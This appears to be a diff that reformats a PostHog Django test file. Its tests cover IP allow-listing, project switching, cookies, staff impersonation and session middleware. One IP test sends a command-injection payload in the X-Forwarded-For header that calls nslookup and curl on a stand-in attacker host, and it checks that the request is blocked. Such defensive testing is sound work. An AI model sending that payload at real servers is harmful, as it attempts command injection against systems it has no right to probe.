@@ -1,15 +1,12 @@
 import json
 from datetime import datetime, timedelta
-
-from freezegun import freeze_time
-from posthog.test.base import APIBaseTest, override_settings
 from unittest.mock import patch
 
 from django.conf import settings
 from django.core.cache import cache
 from django.test import Client as DjangoClient
 from django.urls import reverse
-
+from freezegun import freeze_time
 from rest_framework import status
 from social_core.exceptions import AuthCanceled
 
@@ -20,6 +17,7 @@ from posthog.models.organization import Organization
 from posthog.models.team import Team
 from posthog.models.user import User
 from posthog.settings import SITE_URL
+from posthog.test.base import APIBaseTest, override_settings
 
 
 class TestAccessMiddleware(APIBaseTest):
@@ -30,7 +28,9 @@ class TestAccessMiddleware(APIBaseTest):
         Also test that capture endpoint is not restrictied by ALLOWED_IP_BLOCKS
         """
 
-        with self.settings(ALLOWED_IP_BLOCKS=["192.168.0.0/31", "127.0.0.0/25", "128.0.0.1"]):
+        with self.settings(
+            ALLOWED_IP_BLOCKS=["192.168.0.0/31", "127.0.0.0/25", "128.0.0.1"]
+        ):
             # not in list
             response = self.client.get("/", REMOTE_ADDR="10.0.0.1")
             self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
@@ -128,7 +128,9 @@ class TestAccessMiddleware(APIBaseTest):
             USE_X_FORWARDED_HOST=True,
         ):
             with self.settings(TRUST_ALL_PROXIES=True):
-                response = self.client.get("/", REMOTE_ADDR="28.160.62.192", headers={"x-forwarded-for": ""})
+                response = self.client.get(
+                    "/", REMOTE_ADDR="28.160.62.192", headers={"x-forwarded-for": ""}
+                )
                 self.assertNotIn(b"PostHog is not available", response.content)
 
     def test_ip_with_port_stripped(self):
@@ -139,7 +141,9 @@ class TestAccessMiddleware(APIBaseTest):
             TRUST_ALL_PROXIES=True,
         ):
             # IPv4 with port
-            response = self.client.get("/", headers={"x-forwarded-for": "192.168.0.1:8080"})
+            response = self.client.get(
+                "/", headers={"x-forwarded-for": "192.168.0.1:8080"}
+            )
             self.assertNotIn(b"PostHog is not available", response.content)
 
             # IPv6 with port (bracketed format)
@@ -157,7 +161,9 @@ class TestAccessMiddleware(APIBaseTest):
             # Attack payload in XFF header
             response = self.client.get(
                 "/",
-                headers={"x-forwarded-for": "nslookup${IFS}attacker.com||curl${IFS}attacker.com"},
+                headers={
+                    "x-forwarded-for": "nslookup${IFS}attacker.com||curl${IFS}attacker.com"
+                },
             )
             self.assertIn(b"PostHog is not available", response.content)
 
@@ -210,11 +216,15 @@ class TestAutoProjectMiddleware(APIBaseTest):
         response_users_api = self.client.get(f"/api/users/@me/")
         response_users_api_data = response_users_api.json()
         self.user.refresh_from_db()
-        response_dashboards_api = self.client.get(f"/api/projects/@current/dashboards/{dashboard.id}/")
+        response_dashboards_api = self.client.get(
+            f"/api/projects/@current/dashboards/{dashboard.id}/"
+        )
 
         self.assertEqual(response_app.status_code, 200)
         self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
+        self.assertEqual(
+            response_users_api_data.get("team", {}).get("id"), self.second_team.id
+        )
         self.assertEqual(response_dashboards_api.status_code, 200)
 
     def test_project_switched_when_accessing_dashboard_of_another_accessible_team_with_trailing_slash(
@@ -226,11 +236,15 @@ class TestAutoProjectMiddleware(APIBaseTest):
         response_users_api = self.client.get(f"/api/users/@me/")
         response_users_api_data = response_users_api.json()
         self.user.refresh_from_db()
-        response_dashboards_api = self.client.get(f"/api/projects/@current/dashboards/{dashboard.id}/")
+        response_dashboards_api = self.client.get(
+            f"/api/projects/@current/dashboards/{dashboard.id}/"
+        )
 
         self.assertEqual(response_app.status_code, 200)
         self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
+        self.assertEqual(
+            response_users_api_data.get("team", {}).get("id"), self.second_team.id
+        )
         self.assertEqual(response_dashboards_api.status_code, 200)
 
     def test_project_unchanged_when_accessing_dashboard_of_another_off_limits_team(
@@ -248,16 +262,22 @@ class TestAutoProjectMiddleware(APIBaseTest):
         response_users_api = self.client.get(f"/api/users/@me/")
         response_users_api_data = response_users_api.json()
         self.user.refresh_from_db()
-        response_dashboards_api = self.client.get(f"/api/projects/@current/dashboards/{dashboard.id}/")
+        response_dashboards_api = self.client.get(
+            f"/api/projects/@current/dashboards/{dashboard.id}/"
+        )
 
         self.assertEqual(response_app.status_code, 200)
         self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.team.id)  # NOT third_team
+        self.assertEqual(
+            response_users_api_data.get("team", {}).get("id"), self.team.id
+        )  # NOT third_team
         self.assertEqual(response_dashboards_api.status_code, 404)
 
     @override_settings(PERSON_ON_EVENTS_V2_OVERRIDE=False)
     def test_project_unchanged_when_accessing_dashboards_list(self):
-        with self.assertNumQueries(self.base_app_num_queries + 2):  # No AutoProjectMiddleware queries
+        with self.assertNumQueries(
+            self.base_app_num_queries + 2
+        ):  # No AutoProjectMiddleware queries
             response_app = self.client.get(f"/dashboard")
         response_users_api = self.client.get(f"/api/users/@me/")
         response_users_api_data = response_users_api.json()
@@ -265,7 +285,9 @@ class TestAutoProjectMiddleware(APIBaseTest):
 
         self.assertEqual(response_app.status_code, 200)
         self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.team.id)  # NOT third_team
+        self.assertEqual(
+            response_users_api_data.get("team", {}).get("id"), self.team.id
+        )  # NOT third_team
 
     def test_project_switched_when_accessing_insight_of_another_accessible_team(self):
         insight = Insight.objects.create(team=self.second_team)
@@ -274,11 +296,15 @@ class TestAutoProjectMiddleware(APIBaseTest):
         response_users_api = self.client.get(f"/api/users/@me/")
         response_users_api_data = response_users_api.json()
         self.user.refresh_from_db()
-        response_insights_api = self.client.get(f"/api/projects/@current/insights/{insight.id}/")
+        response_insights_api = self.client.get(
+            f"/api/projects/@current/insights/{insight.id}/"
+        )
 
         self.assertEqual(response_app.status_code, 200)
         self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
+        self.assertEqual(
+            response_users_api_data.get("team", {}).get("id"), self.second_team.id
+        )
         self.assertEqual(response_insights_api.status_code, 200)
 
     def test_project_switched_when_accessing_insight_edit_mode_of_another_accessible_team(
@@ -290,11 +316,15 @@ class TestAutoProjectMiddleware(APIBaseTest):
         response_users_api = self.client.get(f"/api/users/@me/")
         response_users_api_data = response_users_api.json()
         self.user.refresh_from_db()
-        response_insights_api = self.client.get(f"/api/projects/@current/insights/{insight.id}/")
+        response_insights_api = self.client.get(
+            f"/api/projects/@current/insights/{insight.id}/"
+        )
 
         self.assertEqual(response_app.status_code, 200)
         self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
+        self.assertEqual(
+            response_users_api_data.get("team", {}).get("id"), self.second_team.id
+        )
         self.assertEqual(response_insights_api.status_code, 200)
 
     def test_project_switched_when_accessing_action_of_another_accessible_team(self):
@@ -304,11 +334,15 @@ class TestAutoProjectMiddleware(APIBaseTest):
         response_users_api = self.client.get(f"/api/users/@me/")
         response_users_api_data = response_users_api.json()
         self.user.refresh_from_db()
-        response_actions_api = self.client.get(f"/api/projects/@current/actions/{action.id}/")
+        response_actions_api = self.client.get(
+            f"/api/projects/@current/actions/{action.id}/"
+        )
 
         self.assertEqual(response_app.status_code, 200)
         self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
+        self.assertEqual(
+            response_users_api_data.get("team", {}).get("id"), self.second_team.id
+        )
         self.assertEqual(response_actions_api.status_code, 200)
 
     def test_project_switched_when_accessing_cohort_of_another_accessible_team(self):
@@ -318,29 +352,41 @@ class TestAutoProjectMiddleware(APIBaseTest):
         response_users_api = self.client.get(f"/api/users/@me/")
         response_users_api_data = response_users_api.json()
         self.user.refresh_from_db()
-        response_cohorts_api = self.client.get(f"/api/projects/@current/cohorts/{cohort.id}/")
+        response_cohorts_api = self.client.get(
+            f"/api/projects/@current/cohorts/{cohort.id}/"
+        )
 
         self.assertEqual(response_app.status_code, 200)
         self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
+        self.assertEqual(
+            response_users_api_data.get("team", {}).get("id"), self.second_team.id
+        )
         self.assertEqual(response_cohorts_api.status_code, 200)
 
     @override_settings(PERSON_ON_EVENTS_V2_OVERRIDE=False)
     def test_project_switched_when_accessing_feature_flag_of_another_accessible_team(
         self,
     ):
-        feature_flag = FeatureFlag.objects.create(team=self.second_team, created_by=self.user)
+        feature_flag = FeatureFlag.objects.create(
+            team=self.second_team, created_by=self.user
+        )
 
-        with self.assertNumQueries(self.base_app_num_queries + 7):  # +1 from activity logging _get_before_update()
+        with self.assertNumQueries(
+            self.base_app_num_queries + 7
+        ):  # +1 from activity logging _get_before_update()
             response_app = self.client.get(f"/feature_flags/{feature_flag.id}")
         response_users_api = self.client.get(f"/api/users/@me/")
         response_users_api_data = response_users_api.json()
         self.user.refresh_from_db()
-        response_feature_flags_api = self.client.get(f"/api/projects/@current/feature_flags/{feature_flag.id}/")
+        response_feature_flags_api = self.client.get(
+            f"/api/projects/@current/feature_flags/{feature_flag.id}/"
+        )
 
         self.assertEqual(response_app.status_code, 200)
         self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
+        self.assertEqual(
+            response_users_api_data.get("team", {}).get("id"), self.second_team.id
+        )
         self.assertEqual(response_feature_flags_api.status_code, 200)
 
     @override_settings(PERSON_ON_EVENTS_V2_OVERRIDE=False)
@@ -353,7 +399,9 @@ class TestAutoProjectMiddleware(APIBaseTest):
 
         self.assertEqual(response_app.status_code, 200)
         self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.team.id)
+        self.assertEqual(
+            response_users_api_data.get("team", {}).get("id"), self.team.id
+        )
 
     def test_project_switched_when_accessing_another_project_by_id(self):
         project_1_request = self.client.get(f"/project/{self.team.pk}/home")
@@ -364,7 +412,9 @@ class TestAutoProjectMiddleware(APIBaseTest):
         project_2_request = self.client.get(f"/project/{self.second_team.pk}/home")
         response_users_api = self.client.get(f"/api/users/@me/")
         assert project_2_request.status_code == 200
-        assert response_users_api.json().get("team", {}).get("id") == self.second_team.id
+        assert (
+            response_users_api.json().get("team", {}).get("id") == self.second_team.id
+        )
 
     def test_project_unchanged_when_accessing_inaccessible_project_by_id(self):
         project_1_request = self.client.get(f"/project/{self.team.pk}/home")
@@ -437,7 +487,9 @@ class TestPostHogTokenCookieMiddleware(APIBaseTest):
         self.assertEqual(0, len(response.cookies))
 
     def test_logged_in_client(self):
-        self.client.force_login(self.user, backend="django.contrib.auth.backends.ModelBackend")
+        self.client.force_login(
+            self.user, backend="django.contrib.auth.backends.ModelBackend"
+        )
         response = self.client.get("/")
         self.assertEqual(response.status_code, status.HTTP_200_OK)
 
@@ -486,31 +538,55 @@ class TestPostHogTokenCookieMiddleware(APIBaseTest):
         self.assertEqual(ph_last_login_method_cookie["max-age"], 31536000)
 
     def test_logout(self):
-        self.client.force_login(self.user, backend="django.contrib.auth.backends.ModelBackend")
+        self.client.force_login(
+            self.user, backend="django.contrib.auth.backends.ModelBackend"
+        )
         response = self.client.get("/")
         self.assertEqual(response.status_code, status.HTTP_200_OK)
 
-        self.assertEqual(response.cookies["ph_current_project_token"].key, "ph_current_project_token")
-        self.assertEqual(response.cookies["ph_current_project_token"].value, self.team.api_token)
-        self.assertEqual(response.cookies["ph_current_project_token"]["max-age"], 31536000)
+        self.assertEqual(
+            response.cookies["ph_current_project_token"].key, "ph_current_project_token"
+        )
+        self.assertEqual(
+            response.cookies["ph_current_project_token"].value, self.team.api_token
+        )
+        self.assertEqual(
+            response.cookies["ph_current_project_token"]["max-age"], 31536000
+        )
 
-        self.assertEqual(response.cookies["ph_current_project_name"].key, "ph_current_project_name")
-        self.assertEqual(response.cookies["ph_current_project_name"].value, self.team.name)
-        self.assertEqual(response.cookies["ph_current_project_name"]["max-age"], 31536000)
+        self.assertEqual(
+            response.cookies["ph_current_project_name"].key, "ph_current_project_name"
+        )
+        self.assertEqual(
+            response.cookies["ph_current_project_name"].value, self.team.name
+        )
+        self.assertEqual(
+            response.cookies["ph_current_project_name"]["max-age"], 31536000
+        )
 
-        self.assertEqual(response.cookies["ph_current_instance"].key, "ph_current_instance")
+        self.assertEqual(
+            response.cookies["ph_current_instance"].key, "ph_current_instance"
+        )
         self.assertEqual(response.cookies["ph_current_instance"].value, SITE_URL)
         self.assertEqual(response.cookies["ph_current_instance"]["max-age"], 31536000)
 
-        self.assertEqual(response.cookies["ph_last_login_method"].key, "ph_last_login_method")
+        self.assertEqual(
+            response.cookies["ph_last_login_method"].key, "ph_last_login_method"
+        )
         self.assertEqual(response.cookies["ph_last_login_method"].value, "password")
         self.assertEqual(response.cookies["ph_last_login_method"]["max-age"], 31536000)
 
         response = self.client.get("/logout")
 
         # Check that the local cookies will be removed by having 'expires' in the past
-        self.assertTrue(response.cookies["ph_current_project_token"]["expires"] == "Thu, 01 Jan 1970 00:00:00 GMT")
-        self.assertTrue(response.cookies["ph_current_project_name"]["expires"] == "Thu, 01 Jan 1970 00:00:00 GMT")
+        self.assertTrue(
+            response.cookies["ph_current_project_token"]["expires"]
+            == "Thu, 01 Jan 1970 00:00:00 GMT"
+        )
+        self.assertTrue(
+            response.cookies["ph_current_project_name"]["expires"]
+            == "Thu, 01 Jan 1970 00:00:00 GMT"
+        )
         # We don't want to remove the ph_current_instance cookie
         self.assertNotIn("ph_current_instance", response.cookies)
 
@@ -560,7 +636,10 @@ class TestAutoLogoutImpersonateMiddleware(APIBaseTest):
         assert self.client.get("/api/users/@me").json()["email"] == self.user.email
         response = self.login_as_other_user()
         assert response.status_code == 200
-        assert self.client.get("/api/users/@me").json()["email"] == "other-user@posthog.com"
+        assert (
+            self.client.get("/api/users/@me").json()["email"]
+            == "other-user@posthog.com"
+        )
 
     def test_not_staff_user_cannot_login(self):
         self.user.is_staff = False
@@ -613,9 +692,9 @@ class TestAutoLogoutImpersonateMiddleware(APIBaseTest):
                 assert res.status_code == 200
                 assert res.json()["email"] == "other-user@posthog.com"
                 # Format exactly like the date above
-                assert res.json()["is_impersonated_until"] == (now + timedelta(seconds=20)).strftime(
-                    "%Y-%m-%dT%H:%M:%S+00:00"
-                )
+                assert res.json()["is_impersonated_until"] == (
+                    now + timedelta(seconds=20)
+                ).strftime("%Y-%m-%dT%H:%M:%S+00:00")
 
         now = now + timedelta(seconds=19)
         with freeze_time(now):
@@ -650,7 +729,9 @@ class TestAutoLogoutImpersonateMiddleware(APIBaseTest):
 
     def test_after_timeout_admin_page_redirects_to_intended_admin_page(self):
         """When session times out navigating to an admin page, redirect to that page."""
-        third_user = User.objects.create_and_join(self.organization, email="third-user@posthog.com", password="123456")
+        third_user = User.objects.create_and_join(
+            self.organization, email="third-user@posthog.com", password="123456"
+        )
 
         now = datetime.now()
         with freeze_time(now):
@@ -661,7 +742,10 @@ class TestAutoLogoutImpersonateMiddleware(APIBaseTest):
             res = self.client.get(f"/admin/posthog/user/{third_user.id}/change/")
             assert res.status_code == 302
             # Should redirect to the intended admin page, not the impersonated user's page
-            assert res.headers["Location"] == f"/admin/posthog/user/{third_user.id}/change/"
+            assert (
+                res.headers["Location"]
+                == f"/admin/posthog/user/{third_user.id}/change/"
+            )
 
             # Verify we're back to original user
             res = self.client.get("/api/users/@me")
@@ -677,7 +761,10 @@ class TestAutoLogoutImpersonateMiddleware(APIBaseTest):
             # Explicit logout via the main logout endpoint
             res = self.client.get("/logout")
             assert res.status_code == 302
-            assert res.headers["Location"] == f"/admin/posthog/user/{self.other_user.id}/change/"
+            assert (
+                res.headers["Location"]
+                == f"/admin/posthog/user/{self.other_user.id}/change/"
+            )
 
             # Verify we're back to original user
             res = self.client.get("/api/users/@me")
@@ -728,10 +815,15 @@ class TestImpersonationReadOnlyMiddleware(APIBaseTest):
         self.login_as_other_user_read_only()
 
         # Verify we're logged in as the other user
-        assert self.client.get("/api/users/@me").json()["email"] == "other-user@posthog.com"
+        assert (
+            self.client.get("/api/users/@me").json()["email"]
+            == "other-user@posthog.com"
+        )
 
         # Try to delete the dashboard
-        response = self.client.delete(f"/api/projects/{self.team.id}/dashboards/{dashboard.id}/")
+        response = self.client.delete(
+            f"/api/projects/{self.team.id}/dashboards/{dashboard.id}/"
+        )
 
         assert response.status_code == 403
         response_data = response.json()
@@ -761,7 +853,10 @@ class TestImpersonationReadOnlyMiddleware(APIBaseTest):
         self.login_as_other_user_read_only()
 
         # Verify we're logged in as the other user
-        assert self.client.get("/api/users/@me").json()["email"] == "other-user@posthog.com"
+        assert (
+            self.client.get("/api/users/@me").json()["email"]
+            == "other-user@posthog.com"
+        )
 
         # POST to query endpoint - the query itself may fail but we shouldn't get blocked by the middleware
         response = self.client.post(
@@ -771,7 +866,10 @@ class TestImpersonationReadOnlyMiddleware(APIBaseTest):
         )
 
         # Should not be blocked by impersonation middleware (might get other errors)
-        assert response.status_code != 403 or response.json().get("code") != "impersonation_read_only"
+        assert (
+            response.status_code != 403
+            or response.json().get("code") != "impersonation_read_only"
+        )
 
     def test_regular_impersonation_allows_write(self):
         """Verify regular (non-read-only) impersonation can still write."""
@@ -780,7 +878,10 @@ class TestImpersonationReadOnlyMiddleware(APIBaseTest):
         self.login_as_other_user()
 
         # Verify we're logged in as the other user
-        assert self.client.get("/api/users/@me").json()["email"] == "other-user@posthog.com"
+        assert (
+            self.client.get("/api/users/@me").json()["email"]
+            == "other-user@posthog.com"
+        )
 
         # Update should work with regular impersonation
         response = self.client.patch(
@@ -820,13 +921,19 @@ class TestImpersonationReadOnlyMiddleware(APIBaseTest):
         self.login_as_other_user_read_only()
 
         # Verify we're logged in as the other user
-        assert self.client.get("/api/users/@me").json()["email"] == "other-user@posthog.com"
+        assert (
+            self.client.get("/api/users/@me").json()["email"]
+            == "other-user@posthog.com"
+        )
 
         # Explicit logout via main logout endpoint
         response = self.client.get("/logout")
 
         assert response.status_code == 302
-        assert response.headers["Location"] == f"/admin/posthog/user/{self.other_user.id}/change/"
+        assert (
+            response.headers["Location"]
+            == f"/admin/posthog/user/{self.other_user.id}/change/"
+        )
 
         # Verify we're back to original user
         assert self.client.get("/api/users/@me").json()["email"] == self.user.email
@@ -904,7 +1011,10 @@ class TestImpersonationBlockedPathsMiddleware(APIBaseTest):
         self.login_as_other_user()
 
         # Verify we're logged in as the other user
-        assert self.client.get("/api/users/@me/").json()["email"] == "other-user@posthog.com"
+        assert (
+            self.client.get("/api/users/@me/").json()["email"]
+            == "other-user@posthog.com"
+        )
 
         # Try to update user
         response = self.client.patch(
@@ -963,7 +1073,10 @@ class TestImpersonationBlockedPathsMiddleware(APIBaseTest):
         self.login_as_other_user()
 
         # Verify we're logged in as the other user
-        assert self.client.get("/api/users/@me/").json()["email"] == "other-user@posthog.com"
+        assert (
+            self.client.get("/api/users/@me/").json()["email"]
+            == "other-user@posthog.com"
+        )
 
         response = self.client.get("/api/personal_api_keys/")
         assert response.status_code == 200
@@ -973,7 +1086,10 @@ class TestImpersonationBlockedPathsMiddleware(APIBaseTest):
         self.login_as_other_user()
 
         # Verify we're logged in as the other user
-        assert self.client.get("/api/users/@me/").json()["email"] == "other-user@posthog.com"
+        assert (
+            self.client.get("/api/users/@me/").json()["email"]
+            == "other-user@posthog.com"
+        )
 
         response = self.client.post(
             "/api/personal_api_keys/",
@@ -1024,7 +1140,10 @@ class TestImpersonationLoginReasonRequired(APIBaseTest):
         )
 
         # Should now be logged in as other user
-        assert self.client.get("/api/users/@me/").json()["email"] == "other-user@posthog.com"
+        assert (
+            self.client.get("/api/users/@me/").json()["email"]
+            == "other-user@posthog.com"
+        )
 
     def test_impersonation_rejected_with_empty_reason(self):
         """Verify impersonation is rejected when reason is empty string."""
@@ -1087,7 +1206,9 @@ class TestUpgradeImpersonation(APIBaseTest):
         # Upgrade to read-write
         response = self.client.post(
             reverse("impersonation-upgrade"),
-            data=json.dumps({"reason": "Need to make changes for support ticket #5678"}),
+            data=json.dumps(
+                {"reason": "Need to make changes for support ticket #5678"}
+            ),
             content_type="application/json",
         )
         assert response.status_code == 200
@@ -1170,7 +1291,9 @@ class TestSessionAgeMiddleware(APIBaseTest):
         super().setUp()
         cache.clear()
         # Patch time.time before login to ensure session creation time is correct
-        self.time_patcher = patch("time.time", return_value=1704110400.0)  # 2024-01-01 12:00:00
+        self.time_patcher = patch(
+            "time.time", return_value=1704110400.0
+        )  # 2024-01-01 12:00:00
         self.time_patcher.start()
         self.client.force_login(self.user)
         self.time_patcher.stop()
@@ -1337,7 +1460,9 @@ class TestActiveOrganizationMiddleware(APIBaseTest):
         response = self.client.get("/logout")
         # Logout may redirect (302 is normal), but should not redirect to organization-deactivated
         self.assertEqual(response.status_code, status.HTTP_302_FOUND)
-        self.assertNotIn("organization-deactivated", response.headers.get("Location", ""))
+        self.assertNotIn(
+            "organization-deactivated", response.headers.get("Location", "")
+        )
 
     def test_unauthenticated_user_not_affected(self):
         self.client.logout()
